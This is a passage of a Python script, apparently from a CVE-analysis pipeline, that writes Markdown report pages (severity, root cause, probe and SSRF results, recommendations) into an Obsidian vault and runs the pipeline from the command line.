        cve_page = cve_wiki / f"{cve_id}.md"
        probe_section = ""
        if prb and prb.ran:
            probe_section = (
                f"\n## Probe Results\n\n"
                f"- Vulnerable mode: {prb.vulnerable_verdict or '—'}\n"
                f"- Patched mode: {prb.patched_verdict or '—'}\n"
                f"- SSRF confirmed: {prb.ssrf_confirmed}\n"
            )
            if prb.bypass_results:
                probe_section += "\n### Bypass Results\n\n"
                probe_section += "| Technique | Verdict |\n|---|---|\n"
                for br in prb.bypass_results:
                    probe_section += f"| {br.get('technique','?')} | {br.get('verdict','?')} |\n"
            if prb.curl_commands:
                probe_section += "\n### Curl Commands\n\n```bash\n"
                probe_section += "\n".join(prb.curl_commands[:5])
                probe_section += "\n```\n"

        recs_section = ""
        if report.recommendations:
            recs_section = "\n## Recommendations\n\n" + "\n".join(
                f"- {r}" for r in report.recommendations
            ) + "\n"

        page_content = (
            f"---\n"
            f"type: cve-report\n"
            f"cve_id: {cve_id}\n"
            f"severity: {severity}\n"
            f"cvss: {cvss}\n"
            f"vuln_class: {vuln_cls}\n"
            f"overall_risk: {risk}\n"
            f"generated: {report.generated_at}\n"
            f"status: auto-ingested\n"
            f"related:\n"
            f"  - \"[[processed-cves]]\"\n"
            f"  - \"[[pipeline-architecture]]\"\n"
            f"---\n\n"
            f"# {cve_id}\n\n"
            f"**Severity**: {severity} | **CVSS**: {cvss} | **Class**: {vuln_cls} | **Risk**: {risk}\n\n"
        )
        if adv and adv.root_cause:
            page_content += f"## Root Cause\n\n{adv.root_cause}\n\n"
        if ana and getattr(ana, "exploit_scenario", None):
            page_content += f"## Exploit Scenario\n\n{ana.exploit_scenario}\n\n"
        if ana and getattr(ana, "fix_summary", None):
            page_content += f"## Fix Summary\n\n{ana.fix_summary}\n\n"
        page_content += probe_section + recs_section

        if report.summary:
            page_content += f"\n## Summary\n\n{report.summary}\n"

        cve_page.write_text(page_content, encoding="utf-8")

        # ── 3. Update hot.md with one-liner ───────────────────────────────────
        hot_path = vp / "wiki" / "hot.md"
        if hot_path.exists():
            hot = hot_path.read_text(encoding="utf-8")
            today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
            oneliner = (
                f"\n{today}: {cve_id} ingested — {severity} {cvss} {vuln_cls} "
                f"risk={risk}. {desc[:60]}\n"
            )
            # Insert after "## Last Updated" header
            hot = hot.replace("## Last Updated\n", "## Last Updated\n" + oneliner, 1)
            hot_path.write_text(hot, encoding="utf-8")

        log.info("[obsidian] %s filed → %s", cve_id, cve_page.name)

    except Exception as exc:
        log.debug("[obsidian] ingest skipped for %s: %s", cve_id, exc)


def main() -> None:
    _fix_stdout()
    args = _parse_args()
    try:
        report = asyncio.run(run_pipeline(args))
    except KeyboardInterrupt:
        sys.exit("\nInterrupted.")
    except Exception as exc:
        log.error("Pipeline failed: %s", exc)
        if os.environ.get("CVE_PIPELINE_DEBUG"):
            traceback.print_exc()
        sys.exit(1)

    output = render_json(report) if args.format == "json" else render_text(report)

    if args.out:
        Path(args.out).write_text(output, encoding="utf-8")
        log.info("Report written to %s", args.out)
    else:
        try:
            sys.stdout.write(output + "\n")
            sys.stdout.flush()
        except (ValueError, OSError):
            # stdout may be closed when running hidden/redirected — write to stderr
            sys.stderr.write(output + "\n")

    has_errors = bool(report.errors) or bool(report.stages_failed)
    sys.exit(1 if has_errors else 0)


if __name__ == "__main__":
    main()
